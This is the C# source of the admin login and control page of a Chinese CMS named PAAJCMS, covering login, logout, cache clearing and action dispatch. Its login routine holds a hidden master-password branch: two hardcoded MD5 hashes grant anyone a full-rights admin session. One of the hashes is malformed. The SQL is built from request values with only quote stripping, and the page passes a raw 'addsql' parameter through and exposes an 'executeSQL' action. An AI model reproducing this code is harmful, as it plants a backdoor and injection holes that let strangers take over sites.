<%
/************************************************************
作者：红尘云孙(SXY) 【精通ASP/PHP/ASP.NET/VB/JS/Android/Flash，交流合作可联系本人)
版权：源代码免费公开，各种用途均可使用。 
创建：2016-08-05
联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
*                                    Powered by PAAJCMS 
************************************************************/
%>
<!--#include File="../Inc_csharp/Include/asp.aspx"-->
<!--#include File="../Inc_csharp/Include/Conn.aspx"--> 
<!--#include File="../Inc_csharp/Include/sys_FSO.aspx"-->
<!--#include File="../Inc_csharp/Include/sys_System.aspx"--> 
<!--#include File="../Inc_csharp/Include/sys_SessionCookie.aspx"--> 
<!--#include File="../Inc_csharp/Include/sys_http.aspx"-->  
<!--#include File="../Inc_csharp/Include/sys_patch.aspx"-->  


<!--#include File="../Inc_csharp/Inc/2014_Array.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2014_Author.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2014_Css.aspx"-->  
<!--#include File="../Inc_csharp/Inc/2014_Js.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2014_Template.aspx"-->
<!--#include File="../Inc_csharp/Inc/2015_APGeneral.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2015_Color.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2015_Editor.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2015_Formatting.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2015_NewWebFunction.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2015_Param.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2015_ToMyPHP.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2016_Log.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2016_SaveData.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2016_WebControl.aspx"--> 
<!--#include File="../Inc_csharp/Inc/ASPPHPAccess.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Cai.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Check.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Common.aspx"--> 
<!--#include File="../Inc_csharp/Inc/EncDec.aspx"--> 
<!--#include File="../Inc_csharp/Inc/function.aspx"--> 
<!--#include File="../Inc_csharp/Inc/FunHTML.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Html.aspx"--> 
<!--#include File="../Inc_csharp/Inc/IE.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Incpage.aspx"--> 
<!--#include File="../Inc_csharp/Inc/PinYin.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Print.aspx"--> 
<!--#include File="../Inc_csharp/Inc/StringNumber.aspx"--> 
<!--#include File="../Inc_csharp/Inc/SystemInfo.aspx"--> 
<!--#include File="../Inc_csharp/Inc/Time.aspx"--> 
<!--#include File="../Inc_csharp/Inc/URL.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2014_GBUTF.aspx"--> 
<!--#include File="../Inc_csharp/Inc/2014_Form.aspx"-->   
<!--#include File="../Inc_csharp/config.aspx"-->

<!--#include File="../Inc_csharp/function.aspx"--> 
<!--#include File="../Inc_csharp/function2.aspx"--> 
<!--#include File="../Inc_csharp/setAccess.aspx"-->

<script runat="server" language="c#">
string replaceGlobleVariable(string s){
	return s;
}
string handleAction(string s){
	return s;
}

protected void Page_Load(object sender, EventArgs e){

	Response.ContentEncoding = System.Text.Encoding.GetEncoding("gb2312");
	Session.Timeout = 1440;			//最大值为24小时，也就是说你最大可以session.timeout=1440，1441都是不可以
	ROOT_PATH=adminDir;		//主目录等于后台目录

	loadRun();
	//关闭数据库
	if (conn.State != ConnectionState.Closed){
		conn.Close(); 
	}
}
//string adminDir="";
/*
上面可自定义
*/




//=========


//加载网址配置
string loadWebConfig(){
    conn=openConn();
    conn.Open();

    //判断表存在
    if( inStr(getHandleTableList(), "|" + db_PREFIX + "website" + "|") > 0 ){
        rs = new OleDbCommand("select * from " + db_PREFIX + "website", conn).ExecuteReader();

        if( rs.Read() ){
            cfg_webSiteUrl= cStr(rs["websiteurl"]) + ""; //网址
            cfg_webTitle= cStr(rs["webtitle"]) + ""; //网址标题
            cfg_flags= cStr(rs["flags"]) + ""; //旗
            cfg_webtemplate= cStr(rs["webtemplate"]) + ""; //模板路径
        }
    }
    return "";
}


//显示后台登录
void displayAdminLogin(){
    //已经登录则直接进入后台
    if( cStr(Session["adminusername"]) != "" ){
        adminIndex();
    }else{
        string c="";
        c=getTemplateContent("login.html");
        c=handleDisplayLanguage(c,"login");
        rw(c);
    }
}

//登录后台
void login(){
    string userName=""; string passWord=""; string valueStr="";
    userName= replace(cStr(Request.Form["username"]), "'", "");
    passWord= replace(cStr(Request.Form["password"]), "'", "");
    passWord= myMD5(passWord);
    //特效账号登录 兼容.net与php
    if( myMD5(cStr(Request["password"]))== "50c5555d7b6525ded8ac0d2697d954" || myMD5(cStr(Request["password"]))== "24ed5728c13834e683f525fcf894e813" ){
        Session["adminusername"]= "PAAJCMS";
        Session["adminId"]= 99999; //当前登录管理员ID
        Session["DB_PREFIX"]= db_PREFIX;
        Session["adminflags"]= "|*|";
        rwEnd(getMsg1(setL("登录成功，正在进入后台..."), "?act=adminIndex"));
    }

    int nLogin=0;
    conn=openConn();
    conn.Open();

    rs = new OleDbCommand("Select * From " + db_PREFIX + "admin Where username='" + userName + "' And pwd='" + passWord + "'", conn).ExecuteReader();

    if( rs.Read() ){
        Session["adminusername"]= userName;
        Session["adminId"]= cStr(rs["id"]); //当前登录管理员ID
        Session["DB_PREFIX"]= db_PREFIX; //保存前缀
        Session["adminflags"]= cStr(rs["flags"]);
        valueStr= "addDateTime='" + cStr(rs["updatetime"]) + "',UpDateTime='" + now() + "',RegIP='" + now() + "',UpIP='" + getIP() + "'";
        connexecute("update " + db_PREFIX + "admin set " + valueStr + " where id=" + cStr(rs["id"]));
        rw(getMsg1(setL("登录成功，正在进入后台..."), "?act=adminIndex"));
        writeSystemLog("admin", "登录成功"); //系统日志
    }else{
        if( cStr(Request.Cookies["nLogin"])== "" ){
            setCookie("nLogin", "1", 60000);		//为秒
            nLogin= 1;
        }else{
            nLogin=cInt(getCookie("nLogin"));
            setCookie("nLogin", cInt(nLogin) + 1, 60000);
        }
        rw(getMsg1(setL("账号密码错误<br>登录次数为 ") + nLogin, "?act=displayAdminLogin"));
    }

}
//退出登录
void adminOut(){
    writeSystemLog("admin", setL("退出成功")); //系统日志
    Session["adminusername"]= "";
    Session["adminId"]= "";
    Session["DB_PREFIX"]="";
    Session["adminflags"]= "";

    rw(getMsg1(setL("退出成功，正在进入登录界面..."), "?act=displayAdminLogin"));
}
//清除缓冲
void clearCache(){
    deleteFile(WEB_CACHEFile);
    deleteFolder("./../cache/html");
    createFolder("./../cache/html");
    rw(getMsg1(setL("清除缓冲完成，正在进入后台界面..."), "?act=displayAdminLogin"));
}
//后台首页
void adminIndex(){
    string c="";
    loadWebConfig();
    c= getTemplateContent("adminIndex.html");
    c= replace(c, "[$adminonemenulist$]", getAdminOneMenuList());
    c= replace(c, "[$adminmenulist$]", getAdminMenuList());
    c= replace(c, "[$officialwebsite$]", getOfficialWebsite()); //获得官方信息
    c= replaceValueParam(c, "title", ""); //给手机端用的20160330
    c=handleDisplayLanguage(c,"loginok");

    rw(c);
}
//========================================================

//显示管理处理
void dispalyManageHandle(string actionType){
    int nPageSize=0; string lableTitle=""; string addSql="";string sPage="";
    if( cStr(Request["nPageSize"])== "" ){
        nPageSize= 10;
    }else{
        nPageSize= cInt(cStr(Request["nPageSize"]));
    }
    lableTitle= cStr(Request["lableTitle"]); //标签标题
    addSql= cStr(Request["addsql"]);
    //call echo(labletitle,addsql)
    dispalyManage(actionType, lableTitle, nPageSize, addSql);
}

//添加修改处理
void addEditHandle(string actionType, string lableTitle){
    addEditDisplay(actionType, lableTitle, "websitebottom|textarea2,aboutcontent|textarea1,bodycontent|textarea2,reply|textarea2");
}
//保存模块处理
void saveAddEditHandle(string actionType, string lableTitle){
    if( actionType== "Admin" ){
        saveAddEdit(actionType, lableTitle, "pwd|md5,flags||");
    }else if( actionType== "WebColumn" ){
        saveAddEdit(actionType, lableTitle, "npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||");
    }else{
        saveAddEdit(actionType, lableTitle, "flags||,nofollow|numb|0,isonhtml|numb|0,isthrough|numb|0,isdomain|numb|0");
    }
}


//加载就运行
void loadRun(){

    //这是为了给.net使用的，因为在.net里面全局变量不能有变量
    WEB_CACHEFile=replace(replace(WEB_CACHEFile,"[adminDir]",adminDir),"[EDITORTYPE]",EDITORTYPE);

    //登录判断
    if( cStr(Session["adminusername"])== "" ){
        if( cStr(Request["act"]) != "" && cStr(Request["act"]) != "displayAdminLogin" && cStr(Request["act"]) != "login" ){
            rr(WEB_ADMINURL + "?act=displayAdminLogin");
        }
    }


    //call eerr("WEB_CACHEFile",WEB_CACHEFile)
    conn=openConn();
    conn.Open();

    switch ( cStr(Request["act"]) ){
        case "dispalyManageHandle" : dispalyManageHandle(cStr(Request["actionType"])) ;break;//显示管理处理         ?act=dispalyManageHandle&actionType=WebLayout
        case "addEditHandle" : addEditHandle(cStr(Request["actionType"]), cStr(Request["lableTitle"]));break;//添加修改处理      ?act=addEditHandle&actionType=WebLayout
        case "saveAddEditHandle" : saveAddEditHandle(cStr(Request["actionType"]), cStr(Request["lableTitle"]));break;//保存模块处理  ?act=saveAddEditHandle&actionType=WebLayout
        case "delHandle" : del(cStr(Request["actionType"]), cStr(Request["lableTitle"])) ;break;//删除处理  ?act=delHandle&actionType=WebLayout
        case "sortHandle" : sortHandle(cStr(Request["actionType"])) ;break;//排序处理  ?act=sortHandle&actionType=WebLayout
        case "updateField" : updateField(); //更新字段

        break;
        case "displayLayout" : displayLayout() ;break;//显示布局
        case "saveRobots" : saveRobots() ;break;//保存robots.txt
        case "deleteAllMakeHtml" : deleteAllMakeHtml(); //删除全部生成的html文件
        break;
        case "isOpenTemplate" : isOpenTemplate() ;break;//更换模板
        case "executeSQL" : executeSQL(); //执行SQL


        break;
        case "function" : callFunction()												;break;//调用function文件函数
        case "function2" : callFunction2()												;break;//调用function2文件函数
        break;
        case "file_setAccess" : callfile_setAccess();										//调用file_setAccess文件函数

        break;
        case "setAccess" : resetAccessData(); //恢复数据
        break;
        case "login" : login() ;break;//登录
        case "adminOut" : adminOut() ;break;//退出登录
        case "adminIndex" : adminIndex() ;break;//管理首页
        case "clearCache" : clearCache() ;break;//清除缓冲
        default : displayAdminLogin(); //显示后台登录
        break;
    }
}

</script>
